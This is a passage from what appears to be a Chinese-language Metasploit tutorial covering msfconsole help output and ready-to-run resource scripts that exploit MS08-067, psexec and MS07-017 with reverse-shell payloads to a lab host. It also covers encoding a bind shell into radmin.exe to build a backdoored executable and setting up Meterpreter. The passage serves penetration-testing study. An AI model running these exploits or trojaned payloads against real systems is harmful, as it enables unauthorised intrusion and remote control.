检查的模块</li><li>Nops：提高 paylaod 稳定性及维持大小</li></ul></li></ul><h4 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h4><ul><li>使用前先升级：<strong>msfupdate</strong></li><li>msfcli 使用接口，现在已经更新至 msfconsole -x</li><li>msfconsole 使用接口<ul><li>最流行的用户接口</li><li>几乎可以使用全部 msf 功能</li><li>控制台命令支持 TAB 自动补全</li><li>支持外部命令的执行（系统命令等）</li></ul></li><li>点击鼠标启动</li></ul><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">通用选项:</span><br><span class="line">    -<span class="ruby">E, --environment ENVIRONMENT    设置Rails环境，默认为RAIL_ENV环境变量或<span class="string">'生产'</span></span></span><br><span class="line"></span><br><span class="line"><span class="ruby">数据库选项<span class="symbol">:</span></span></span><br><span class="line"><span class="ruby">    -M, --migration-path DIRECTORY   指定包含其他数据库迁移的目录</span></span><br><span class="line"><span class="ruby">    -n, --no-database                禁用数据库支持</span></span><br><span class="line"><span class="ruby">    -y, --yaml PATH                  指定一个包含数据库设置的YAML文件</span></span><br><span class="line"></span><br><span class="line"><span class="ruby">框架选项<span class="symbol">:</span></span></span><br><span class="line"><span class="ruby">    -c FILE                          加载指定的配置文件</span></span><br><span class="line"><span class="ruby">    -v, -V, --version                显示版本</span></span><br><span class="line"></span><br><span class="line"><span class="ruby">模块选项<span class="symbol">:</span></span></span><br><span class="line"><span class="ruby">        --defer-<span class="class"><span class="keyword">module</span>-<span class="title">loads</span>         除非明确询问，否则推迟模块加载</span></span></span><br><span class="line"><span class="ruby">    -m, --<span class="class"><span class="keyword">module</span>-<span class="title">path</span> <span class="title">DIRECTORY</span>      加载一个额外的模块路径</span></span></span><br><span class="line"></span><br><span class="line"><span class="ruby">控制台选项<span class="symbol">:</span></span></span><br><span class="line"><span class="ruby">    -a, --ask                        在退出Metasploit之前询问或接受<span class="string">'退出-y'</span></span></span><br><span class="line"><span class="ruby">    -H, --history-file FILE          将命令历史记录保存到指定的文件</span></span><br><span class="line"><span class="ruby">    -L, --real-readline              使用系统Readline库而不是RbReadline</span></span><br><span class="line"><span class="ruby">    -o, --output FILE                输出到指定的文件</span></span><br><span class="line"><span class="ruby">    -p, --plugin PLUGIN              在启动时加载插件</span></span><br><span class="line"><span class="ruby">    -q, --quiet                      不要在启动时显示 banner 信息</span></span><br><span class="line"><span class="ruby">    -r, --resource FILE              执行指定的资源文件（ - 用于stdin）</span></span><br><span class="line"><span class="ruby">    -x, --execute-command COMMAND    执行指定的控制台命令（使用;用于倍数）</span></span><br><span class="line"><span class="ruby">    -h, --help                       显示此消息</span></span><br></pre></td></tr></table></figure><ul><li>进入 msfconsole，查看帮助信息</li></ul><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# msfconsole</span><br><span class="line">msf &gt; help</span><br><span class="line"></span><br><span class="line">核心命令</span><br><span class="line">=============</span><br><span class="line"></span><br><span class="line"><span class="code">    命令            描述</span></span><br><span class="line"><span class="code">    -------       -----------</span></span><br><span class="line"><span class="code">    ?             帮助菜单</span></span><br><span class="line"><span class="code">    banner        显示一个很棒的metasploit横幅</span></span><br><span class="line"><span class="code">    cd            更改当前的工作目录</span></span><br><span class="line"><span class="code">    color         切换高亮显示颜色</span></span><br><span class="line"><span class="code">    connect       连接与主机通信</span></span><br><span class="line"><span class="code">    exit          退出退出控制台</span></span><br><span class="line"><span class="code">    get           获取特定于上下文的变量的值</span></span><br><span class="line"><span class="code">    getg          获取全局变量的值</span></span><br><span class="line"><span class="code">    grep          Grep另一个命令的输出</span></span><br><span class="line"><span class="code">    help          帮助菜单</span></span><br><span class="line"><span class="code">    history       历史显示命令历史</span></span><br><span class="line"><span class="code">    irb           进入irb脚本模式</span></span><br><span class="line"><span class="code">    load          加载一个框架插件</span></span><br><span class="line"><span class="code">    quit          退出控制台</span></span><br><span class="line"><span class="code">    route         路由通过会话路由流量</span></span><br><span class="line"><span class="code">    save          保存保存活动的数据存储</span></span><br><span class="line"><span class="code">    sessions      会话转储会话列表并显示有关会话的信息</span></span><br><span class="line"><span class="code">    set           将特定于上下文的变量设置为一个值</span></span><br><span class="line"><span class="code">    setg          将全局变量设置为一个值</span></span><br><span class="line"><span class="code">    sleep         睡眠在指定的秒数内不执行任何操作</span></span><br><span class="line"><span class="code">    spool         将控制台输出写入文件以及屏幕</span></span><br><span class="line"><span class="code">    threads       线程查看和操作后台线程</span></span><br><span class="line"><span class="code">    unload        卸载卸载框架插件</span></span><br><span class="line"><span class="code">    unset         取消设置取消设置一个或多个特定于上下文的变量</span></span><br><span class="line"><span class="code">    unsetg        取消设置取消设置一个或多个全局变量</span></span><br><span class="line"><span class="code">    version       版本显示框架和控制台库版本号</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">模块命令</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line"><span class="code">    命令            描述</span></span><br><span class="line"><span class="code">    -------       -----------</span></span><br><span class="line"><span class="code">    advanced      高级显示一个或多个模块的高级选项</span></span><br><span class="line"><span class="code">    back          返回从当前上下文返回</span></span><br><span class="line"><span class="code">    edit          编辑使用首选编辑器编辑当前模块或文件</span></span><br><span class="line"><span class="code">    info          显示有关一个或多个模块的信息</span></span><br><span class="line"><span class="code">    loadpath      加载路径搜索并加载路径中的模块</span></span><br><span class="line"><span class="code">    options       选项显示全局选项或一个或多个模块</span></span><br><span class="line"><span class="code">    popm          将最新的模块从堆栈弹出并使其处于活动状态</span></span><br><span class="line"><span class="code">    previous      将之前加载的模块设置为当前模块</span></span><br><span class="line"><span class="code">    pushm         将活动或模块列表推入模块堆栈</span></span><br><span class="line"><span class="code">    reload_all    重新加载所有定义的模块路径中的所有模块</span></span><br><span class="line"><span class="code">    reload_lib    从指定路径加载库文件</span></span><br><span class="line"><span class="code">    search        搜索搜索模块名称和说明</span></span><br><span class="line"><span class="code">    show          显示给定类型的模块或所有模块</span></span><br><span class="line"><span class="code">    use           使用按名称选择模块</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">工作命令</span><br><span class="line">============</span><br><span class="line"></span><br><span class="line"><span class="code">    命令            描述</span></span><br><span class="line"><span class="code">    -------       -----------</span></span><br><span class="line"><span class="code">    handler       处理程序作为作业启动负载处理程序</span></span><br><span class="line"><span class="code">    jobs          作业显示和管理作业</span></span><br><span class="line"><span class="code">    kill          杀死一份工作</span></span><br><span class="line"><span class="code">    rename_job    重命名作业</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">资源脚本命令</span><br><span class="line">========================</span><br><span class="line"></span><br><span class="line"><span class="code">    命令            描述</span></span><br><span class="line"><span class="code">    -------       -----------</span></span><br><span class="line"><span class="code">    makerc        保存从开始到文件输入的命令</span></span><br><span class="line"><span class="code">    resource      运行存储在文件中的命令</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">数据库后端命令</span><br><span class="line">=========================</span><br><span class="line"></span><br><span class="line"><span class="code">    命令                描述</span></span><br><span class="line"><span class="code">    -------           -----------</span></span><br><span class="line"><span class="code">    db_connect        连接到现有的数据库</span></span><br><span class="line"><span class="code">    db_disconnect     断开当前数据库实例</span></span><br><span class="line"><span class="code">    db_export         导出包含数据库内容的文件</span></span><br><span class="line"><span class="code">    db_import         导入扫描结果文件（文件类型将被自动检测）</span></span><br><span class="line"><span class="code">    db_nmap           执行nmap并自动记录输出</span></span><br><span class="line"><span class="code">    db_rebuild_cache  重建数据库存储的模块缓存</span></span><br><span class="line"><span class="code">    db_status         显示当前的数据库状态</span></span><br><span class="line"><span class="code">    hosts             列出数据库中的所有主机</span></span><br><span class="line"><span class="code">    loot              列出数据库中的所有战利品</span></span><br><span class="line"><span class="code">    notes             列出数据库中的所有注释</span></span><br><span class="line"><span class="code">    services          列出数据库中的所有服务</span></span><br><span class="line"><span class="code">    vulns             列出数据库中的所有漏洞</span></span><br><span class="line"><span class="code">    workspace         在数据库工作区之间切换</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">凭证后端命令</span><br><span class="line">============================</span><br><span class="line"></span><br><span class="line"><span class="code">    命令            描述</span></span><br><span class="line"><span class="code">    -------       -----------</span></span><br><span class="line"><span class="code">    creds         列出数据库中的所有凭据(密码)</span></span><br></pre></td></tr></table></figure><ul><li>msf &gt; help show</li></ul><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[*]“<span class="keyword">show</span>” 命令的有效参数是：<span class="keyword">all</span>, encoders, nops, exploits, payloads, auxiliary, plugins, <span class="keyword">info</span>, <span class="keyword">options</span></span><br><span class="line">[*]其他特定于模块的参数是：missing, advanced, evasion, targets, actions</span><br></pre></td></tr></table></figure><ul><li>msf &gt; help search</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">用法</span>: <span class="string">search [keywords]</span></span><br><span class="line"></span><br><span class="line"><span class="attr">Keywords</span>:<span class="string"></span></span><br><span class="line">  <span class="attr">app</span>       :  <span class="string">客户端或服务器攻击的模块</span></span><br><span class="line">  <span class="attr">author</span>    :  <span class="string">本作者编写的模块</span></span><br><span class="line">  <span class="attr">bid</span>       :  <span class="string">具有匹配的Bugtraq ID的模块</span></span><br><span class="line">  <span class="attr">cve</span>       :  <span class="string">具有匹配CVE ID的模块</span></span><br><span class="line">  <span class="attr">edb</span>       :  <span class="string">具有匹配的Exploit-DB ID的模块</span></span><br><span class="line">  <span class="attr">name</span>      :  <span class="string">具有匹配描述性名称的模块</span></span><br><span class="line">  <span class="attr">platform</span>  :  <span class="string">影响这个平台的模块</span></span><br><span class="line">  <span class="attr">ref</span>       :  <span class="string">具有匹配参考的模块</span></span><br><span class="line">  <span class="attr">type</span>      :  <span class="string">特定类型的模块（exploit，auxiliary或post）</span></span><br><span class="line"></span><br><span class="line"><span class="attr">msf</span> <span class="string">&gt; search ms08-067</span></span><br><span class="line"><span class="attr">msf</span> <span class="string">&gt; search name:mysql / type:aux /author:aaron    # 可多条件同时搜索</span></span><br></pre></td></tr></table></figure><ul><li>模块内命令</li></ul><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; search ms09_001_write</span><br><span class="line">msf &gt; use auxiliary<span class="regexp">/dos/</span>windows<span class="regexp">/smb/</span>ms09_001_write</span><br><span class="line">msf auxiliary(dos<span class="regexp">/windows/</span>smb/ms09_001_write) &gt; info</span><br><span class="line"></span><br><span class="line">[*]其他特定于模块的参数是：missing, advanced, evasion, targets, actions</span><br><span class="line">msf auxiliary(dos<span class="regexp">/windows/</span>smb/ms09_001_write) &gt; show missing</span><br><span class="line">msf auxiliary(dos<span class="regexp">/windows/</span>smb/ms09_001_write) &gt; show advanced</span><br><span class="line">msf auxiliary(dos<span class="regexp">/windows/</span>smb/ms09_001_write) &gt; show targets</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf auxiliary(dos<span class="regexp">/windows/</span>smb/ms09_001_write) &gt; help edit</span><br><span class="line">    用法：编辑[file <span class="regexp">/ to /</span> edit.rb]</span><br><span class="line">    使用编辑当前活动模块或本地文件。</span><br><span class="line">    如果指定了文件路径，它将在编辑后自动重新加载。</span><br><span class="line">    否则，您可以使用“重新加载”或“重新运行”来重新加载活动模块。</span><br><span class="line">msf auxiliary(dos<span class="regexp">/windows/</span>smb/ms09_001_write) &gt; edit</span><br></pre></td></tr></table></figure><ul><li>数据库操作</li></ul><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; <span class="keyword">help</span> db_<span class="keyword">connect</span> </span><br><span class="line">    [*]    Usage: db_<span class="keyword">connect</span> &lt;user<span class="function">:pass</span>&gt;@&lt;host<span class="function">:port</span>&gt;/&lt;database&gt;</span><br><span class="line">    [*]       OR: db_<span class="keyword">connect</span> -y [path/to/database.yml]</span><br><span class="line">    [*] Examples:</span><br><span class="line">    [*]        db_<span class="keyword">connect</span> user@metasploit3</span><br><span class="line">    [*]        db_<span class="keyword">connect</span> user<span class="function">:pass</span>@192.168.0.2/metasploit3</span><br><span class="line">    [*]        db_<span class="keyword">connect</span> user<span class="function">:pass</span>@192.168.0.2<span class="function">:1500</span>/metasploit3</span><br><span class="line"></span><br><span class="line">msf &gt; <span class="keyword">help</span> db_import</span><br><span class="line">    Usage: db_import &lt;filename&gt; [file2.<span class="string">..</span>]</span><br><span class="line">    Filenames can be globs like *<span class="string">.xml</span>, or **/*<span class="string">.xml</span> which will search recursively</span><br><span class="line"></span><br><span class="line">msf &gt; <span class="keyword">help</span> db_export</span><br><span class="line">    Usage:</span><br><span class="line">    db_export -f &lt;format&gt; [filename]</span><br><span class="line">    Format can be one of: xml, pwdump</span><br></pre></td></tr></table></figure><ul><li>msf &gt; help sessions<br>Usage: sessions [options] or sessions [id]</li></ul><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">活动的会话操作和交互。</span><br><span class="line"></span><br><span class="line">选项:</span><br><span class="line"></span><br><span class="line">    -<span class="ruby">C &lt;opt&gt;  在-i或全部给定的会话上运行Meterpreter命令</span></span><br><span class="line"><span class="ruby">    -K        终止所有会话</span></span><br><span class="line"><span class="ruby">    -S &lt;opt&gt;  行搜索过滤器。</span></span><br><span class="line"><span class="ruby">    -c &lt;opt&gt;  在-i或全部给定的会话上运行命令</span></span><br><span class="line"><span class="ruby">    -h        帮助横幅</span></span><br><span class="line"><span class="ruby">    -i &lt;opt&gt;  与提供的会话ID进行交互</span></span><br><span class="line"><span class="ruby">    -k &lt;opt&gt;  按会话ID和/或范围终止会话</span></span><br><span class="line"><span class="ruby">    -l        列出所有活动会话</span></span><br><span class="line"><span class="ruby">    -n &lt;opt&gt;  按ID命名或重命名会话</span></span><br><span class="line"><span class="ruby">    -q        静音模式</span></span><br><span class="line"><span class="ruby">    -r        重置用-i或全部给定的会话的环形缓冲区</span></span><br><span class="line"><span class="ruby">    -s &lt;opt&gt;  在-i或全部给定的会话上运行脚本或模块</span></span><br><span class="line"><span class="ruby">    -t &lt;opt&gt;  设置响应超时（默认值：<span class="number">15</span>）</span></span><br><span class="line"><span class="ruby">    -u &lt;opt&gt;  在许多平台上将shell升级到meterpreter会话</span></span><br><span class="line"><span class="ruby">    -v        以详细模式列出会话</span></span><br><span class="line"><span class="ruby">    -x        在会话表中显示扩展信息</span></span><br><span class="line"></span><br><span class="line"><span class="ruby">许多选项允许使用逗号和破折号指定会话范围。</span></span><br><span class="line"><span class="ruby">例如:  sessions -s checkvm -i <span class="number">1</span>,<span class="number">3</span>-<span class="number">5</span>  <span class="keyword">or</span>  sessions -k <span class="number">1</span>-<span class="number">2</span>,<span class="number">5</span>,<span class="number">6</span></span></span><br></pre></td></tr></table></figure><h4 id="5-Exploit-模块"><a href="#5-Exploit-模块" class="headerlink" title="5. Exploit 模块"></a>5. Exploit 模块</h4><h5 id="1-Active-exploit"><a href="#1-Active-exploit" class="headerlink" title="1.Active exploit"></a>1.Active exploit</h5><p>攻击者主动连接受害者：</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# cat ms08067.rb </span><br><span class="line">use exploit/windows/smb/ms08_067_netapi</span><br><span class="line"><span class="keyword">set</span> RHOST <span class="comment">10.10.10.147</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">RPORT 445</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">PAYLOAD windows</span>/shell/<span class="comment">reverse_tcp</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">LHOST 10.10.10.131</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">LPORT 4444</span></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p><img src="rNO4Mud.png" alt="img"></p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# cat psexec.rb </span><br><span class="line">use exploit/windows/smb/psexec</span><br><span class="line"><span class="keyword">set</span> RHOST <span class="comment">10.10.10.148</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">PAYLOAD windows</span>/shell/<span class="comment">reverse_tcp</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">LHOST 10.10.10.131</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">LPORT 4444</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">SMBUSER Administrator</span></span><br><span class="line"><span class="keyword">set</span> <span class="comment">SMBPASS 123456</span></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p><img src="ctvHDYR.png" alt="img"></p><h5 id="2-Passive-Exploits"><a href="#2-Passive-Exploits" class="headerlink" title="2. Passive Exploits"></a>2. Passive Exploits</h5><p>攻击者等待受害者来触发连接，反弹到攻击者</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# cat ms07017.rb </span><br><span class="line">use exploit/windows/browser/ms07_017_ani_loadimage_chunksize</span><br><span class="line"><span class="builtin-name">set</span> URIPATH /</span><br><span class="line"><span class="builtin-name">set</span> SRVHOST 0.0.0.0</span><br><span class="line"><span class="builtin-name">set</span> PAYLOAD windows/shell/reverse_tcp</span><br><span class="line"><span class="builtin-name">set</span> EXITFUNC thread</span><br><span class="line"><span class="builtin-name">set</span> LHOST 10.10.10.131</span><br><span class="line"><span class="builtin-name">set</span> LPORT 4444</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p><img src="meKMAdB.png" alt="img"></p><p><img src="aEu1anZ.png" alt="img"></p><h4 id="6-生成payload"><a href="#6-生成payload" class="headerlink" title="6.生成payload"></a>6.生成payload</h4><ul><li>用法</li></ul><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; <span class="built_in">search</span> ms08-<span class="number">067</span></span><br><span class="line">msf &gt; use payload/windows/<span class="keyword">shell</span>/bind_tcp</span><br><span class="line">msf payload(windows/<span class="keyword">shell</span>/bind_tcp) &gt; generate  #获得shellcode</span><br><span class="line">msf payload(windows/<span class="keyword">shell</span>/bind_tcp) &gt; generate -h</span><br><span class="line">    Usage: generate [<span class="keyword">options</span>]</span><br><span class="line">    Generates <span class="keyword">a</span> payload.</span><br><span class="line">    OPTIONS:</span><br><span class="line">        -E        强制编码。</span><br><span class="line">        -<span class="keyword">b</span> <span class="symbol">&lt;opt&gt;</span>  要避免的字符列表：<span class="string">'\ x00 \ xff'</span></span><br><span class="line">        -<span class="keyword">e</span> <span class="symbol">&lt;opt&gt;</span>  要使用的编码器模块的名称。</span><br><span class="line">        -<span class="keyword">f</span> <span class="symbol">&lt;opt&gt;</span>  输出文件名（否则为stdout）</span><br><span class="line">        -h        帮助横幅。</span><br><span class="line">        -i <span class="symbol">&lt;opt&gt;</span>  编码迭代的次数。</span><br><span class="line">        -<span class="keyword">k</span>        保持模板可执行的功能</span><br><span class="line">        -<span class="keyword">o</span> <span class="symbol">&lt;opt&gt;</span>  以VAR = VAL格式逗号分隔的选项列表。</span><br><span class="line">        -<span class="keyword">p</span> <span class="symbol">&lt;opt&gt;</span>  输出平台</span><br><span class="line">        -s <span class="symbol">&lt;opt&gt;</span>  NOP sled length.</span><br><span class="line">        -t <span class="symbol">&lt;opt&gt;</span>  输出格式: bash,<span class="keyword">c</span>,csharp,dw,dword,hex,java,js_be,js_le,num,<span class="keyword">perl</span>,pl,powershell,ps1,<span class="keyword">py</span>,<span class="keyword">python</span>,raw,rb,<span class="keyword">ruby</span>,<span class="keyword">sh</span>,vbapplication,vbscript,asp,aspx,aspx-<span class="keyword">exe</span>,axis2,dll,elf,elf-<span class="keyword">so</span>,<span class="keyword">exe</span>,<span class="keyword">exe</span>-<span class="keyword">only</span>,<span class="keyword">exe</span>-service,<span class="keyword">exe</span>-small,hta-psh,jar,jsp,loop-vbs,macho,msi,msi-nouac,osx-app,psh,psh-cmd,psh-net,psh-reflection,vba,vba-<span class="keyword">exe</span>,vba-psh,vbs,war</span><br><span class="line">        -<span class="keyword">x</span> <span class="symbol">&lt;opt&gt;</span>  要使用的可执行模板</span><br><span class="line"></span><br><span class="line">msf payload(windows/<span class="keyword">shell</span>/bind_tcp) &gt; generate</span><br></pre></td></tr></table></figure><p><img src="wEztOAj.png" alt="img"></p><ul><li>自动绕过坏字符</li></ul><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf payload(windows/shell/bind_tcp) &gt; generate -b '<span class="symbol">\x</span>00'</span><br><span class="line">msf payload(windows/shell/bind_tcp) &gt; generate -b '<span class="symbol">\x</span>00<span class="symbol">\x</span>44<span class="symbol">\x</span>67<span class="symbol">\x</span>66<span class="symbol">\x</span>fa<span class="symbol">\x</span>01<span class="symbol">\x</span>e0<span class="symbol">\x</span>44<span class="symbol">\x</span>67<span class="symbol">\x</span>a1<span class="symbol">\x</span>a2<span class="symbol">\x</span>a3<span class="symbol">\x</span>75<span class="symbol">\x</span>4b'</span><br></pre></td></tr></table></figure><ul><li>手动指定编码模块</li></ul><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf payload(windows/<span class="keyword">shell</span><span class="bash">/bind_tcp) &gt; show encoders</span></span><br></pre></td></tr></table></figure><p><img src="siajCwd.png" alt="img"></p><ul><li>注入文件</li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf payload(windows<span class="regexp">/shell/</span>bind_tcp) &gt; generate -b <span class="string">'\x00'</span> -t exe -e x86<span class="regexp">/shikata_ga_nai -i 5 -k -x /u</span>sr<span class="regexp">/share/</span>windows-binaries<span class="regexp">/radmin.exe -f /</span>root<span class="regexp">/1.exe</span></span><br></pre></td></tr></table></figure><ul><li><p>NOP：no-operation / Next Operation （无任何操作）</p><ul><li>EIP 返回存储 NOP sled 的任意地址时将递增，最终导致 shellcode 执行</li><li>增加一行 EOP</li></ul><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf payload(windows/shell/bind_tcp) &gt; <span class="keyword">generate</span> -s <span class="number">14</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="7-metepreter"><a href="#7-metepreter" class="headerlink" title="7. metepreter"></a>7. metepreter</h4><h5 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h5><ul><li>高级、动态、可扩展的 payload<ul><li>基于 metepreter 上下文利用更多漏洞发起攻击</li><li>后渗透测试阶段一站式操作界面</li></ul></li><li>完全基于内存的 DLL 注入式 payload （不写硬盘）<ul><li>注入合法系统进程并建立 stager</li><li>基于 stager 上传和预加载 dll 进行扩展模块 TLS/1.0 通信隧道</li><li>利用 TLS 隧道进一步加载后续扩展模块（避免网络取证）</li></ul></li><li>服务端使用 c 语言编写</li><li>客户端提供基于 ruby 的全特性 API（支持任何语言）</li></ul><h5 id="2-使用"><a href="#2-使用" class="headerlink" title="2.使用"></a>2.使用</h5><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">root@</span>kali:~# cat metepreter.rb </span><br><span class="line">use exploit/windows/smb/ms08_067_netapi</span><br><span class="line"><span class="keyword">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="keyword">set</span> RHOST <span class="number">10.10</span><span class="number">.10</span><span class="number">.147</span></span><br><span class="line"><span class="keyword">set</span> LHOST <span class="number">10.10</span><span class="number">.10</span><span class="number">.131</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="b9G8Uq6.png" alt="img"></p><ul><li>帮助文件</li></ul><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 